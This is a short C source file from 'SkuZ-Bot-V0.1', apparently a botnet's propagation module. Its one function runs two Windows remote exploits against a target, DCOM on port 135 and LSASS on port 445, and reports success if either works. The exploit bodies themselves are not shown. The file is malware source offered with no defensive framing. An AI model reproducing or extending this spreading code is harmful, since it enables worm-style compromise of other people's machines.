/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 
#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_DSS

BOOL dss(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = dcom(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	return bDCOM || bLSASS ? TRUE : FALSE;
}

#endif
#endif
#endif
/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 